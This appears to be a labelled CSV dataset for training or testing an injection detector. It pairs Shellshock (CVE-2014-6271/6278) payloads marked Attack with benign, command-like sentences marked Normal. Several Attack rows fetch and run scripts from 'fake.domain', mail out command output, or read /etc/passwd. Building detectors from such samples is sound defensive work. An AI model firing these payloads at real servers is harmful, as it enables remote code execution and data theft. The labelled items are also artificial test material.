Content,Category,Label
foo%0d%0a() { :; }just a test,shellshock2,Normal
clearly()not{ shell:shock;},shellshock2,Normal
() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; },shellshock2,Attack
() { _;}>_[$($())] { echo x;},shellshock2,Attack
(%00) { :; }; echo 'CVE-2014-6271 vulnerable',shellshock2,Attack
() { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; } bash -c id,shellshock2,Attack
() { 0; }; echo vulnerable; bash -c,shellshock2,Attack
() { :;}; /bin/bash -c 'cd /tmp;wget http://fake.domain/ji;curl -O /tmp/ji http://fake.domain/ji ; perl /tmp/ji;rm -rf /tmp/ji',shellshock2,Attack
"() { :;}; /bin/bash -c ""/usr/bin/env curl -s http://fake.domain/cl.py > /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sleep 5; rm -rf /tmp/clamd_update""",shellshock2,Attack
"() { :;}; /bin/bash -c ""whoami | mail -s 'example.com l' test.tester@fake.domain""",shellshock2,Attack
() {:;}; /bin/cat /etc/passwd,shellshock2,Attack
() { :; }; /bin/eject,shellshock2,Attack
() { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20,shellshock2,Attack
() { :;}; echo $(</etc/passwd),shellshock2,Attack
() { :; }; echo 'CVE-2014-6271 vulnerable',shellshock2,Attack
"() { :;}; echo ""NS:"" $(</etc/passwd)",shellshock2,Attack
() { foo() { foo; }; >bar; },shellshock2,Attack
() { function a a>\ bash -c echo,shellshock2,Attack
() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd,shellshock2,Attack
"() { ignored; };; echo ""NS:"" $(</etc/passwd)",shellshock2,Attack
() {:;}; ping -c 1 -p cb18cb3f7bca4441a595fcc1e240deb0 fake.domain,shellshock2,Attack
"() { test;};echo ""Content-type: text/plain""; echo; echo; /bin/cat /etc/passwd",shellshock2,Attack
() { test;}; echo; echo; /bin/cat /etc/passwd,shellshock2,Attack
() {:;}; /usr/bin/wget http://fake.domain/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== >> /dev/null,shellshock2,Attack
().{.:;.};.wget /tmp/foo http://fake.domain chmod.777 /tmp/foo; /tmp/foo;,shellshock2,Attack
() { x() { _; }; x() { _; } <<a; } bash -c,shellshock2,Attack
Oxygen & Sleep Associates Inc,cmdexe2,Normal
LC & NC - Boys038-XL.jpg,cmdexe2,Normal
mammal;cat;ears,cmdexe2,Normal
"The Senora found herself a heroine; more than that, she became aware",cmdexe2,Normal
time he came.,cmdexe2,Normal
echo in the mirror,cmdexe2,Normal
curl and divergence,cmdexe2,Normal
exec noun,cmdexe2,Normal
bash away in the gym,cmdexe2,Normal
zsh is the best!,cmdexe2,Normal
java lang courses,cmdexe2,Normal
ls 300 lexus,cmdexe2,Normal
nc 8000 controller,cmdexe2,Normal
I would like to be notified when the ASIN: B07JJS7WY7 is back in stock.,cmdexe2,Normal
Can I please adjust_campaign:sign?,cmdexe2,Normal
I would like to request information about the width of the time parameter.,cmdexe2,Normal
I would like to request the /cc serviceCode with the parameter: serviceCode|{},cmdexe2,Normal
The version parameter is set to _<> in the HTTP request.,cmdexe2,Normal
in:devkey,cmdexe2,Normal
"If the subject parameter is greater than 0, then return a list of all articles with that subject.",cmdexe2,Normal
I would like to request the log files for the ord parameter.,cmdexe2,Normal
I would like to tan and follow you on Instagram.,cmdexe2,Normal
"I would like to request a random number between 1 and 10, please.",cmdexe2,Normal
I would like to request the bin with app_id: (],cmdexe2,Normal
I would like to request information about the address: (#)saddr for the next minute.,cmdexe2,Normal
I would like to request the maximum value for parameter v.,cmdexe2,Normal
I would like to know the serviceCode for the {param} I am interested in.,cmdexe2,Normal
"I would like to keep-alive my connection and have the full_text of the article, please.",cmdexe2,Normal
I would like to keep alive the parameter 75oBC.,cmdexe2,Normal
"I would like to create a new calendar called ""cursor"" please.",cmdexe2,Normal
I would like the information for EJ% please.,cmdexe2,Normal
Can I please get the id for the user that I am trying to follow?,cmdexe2,Normal
DELETE 75oBC$,cmdexe2,Normal
The parameter 5 is&|.,cmdexe2,Normal
and =IS=C5HF95_=,cmdexe2,Normal
"I would like to request information on the cursor, please.",cmdexe2,Normal
and &IN=color&=,cmdexe2,Normal
I would like to request information about the idv_msdb database.,cmdexe2,Normal
"I would like to see the config for the longitude, please.",cmdexe2,Normal
You seem very interested in history,cmdexe2,Normal
I would like to request the width of the :.conf file.,cmdexe2,Normal
I would like to adjust_campaign] in the system.,cmdexe2,Normal
test&usr=subject;-,cmdexe2,Normal
"I would like to request the local version of the website in French, so I will include the parameter ""hl=fr""",cmdexe2,Normal
The standard for the <$ tag is to enclose text or code that should be interpreted as a dollar amount.,cmdexe2,Normal
I would like to request information about the shadow EXFFJT.,cmdexe2,Normal
I would like to :hosts the :scenario please.,cmdexe2,Normal
I would like to see a list of drivers sorted in reverse order.,cmdexe2,Normal
I would like to request a file from the server with the parameter v and the special characters :.,cmdexe2,Normal
Can I please have a Python tutorial for qr code scanning?,cmdexe2,Normal
I would like to request the nice C#-_ parameter.,cmdexe2,Normal
I would like to fetch all of the data for longitude : *,cmdexe2,Normal
I would like to sleep for count hours.,cmdexe2,Normal
"I would like to see the runtime for the payload, please.",cmdexe2,Normal
I would like to process the gclid parameter.,cmdexe2,Normal
and I would like to see all of the items that are type <enter type here>.,cmdexe2,Normal
[Host: type: {[,cmdexe2,Normal
I would like to request the host for the user_code: &,cmdexe2,Normal
What is the name of the package you are looking for?,cmdexe2,Normal
